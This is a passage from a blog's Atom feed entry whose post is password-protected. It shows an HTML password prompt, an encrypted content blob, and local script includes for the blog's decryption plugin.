    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19NbeIzVa6t0qcvyLMocdK3SLMR1lrNO0jYr4V2O7p3XtV05RjRMDpEWdLjU2G6ihNRpt8LwbDEJw==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
    
  </entry>
  
</feed>
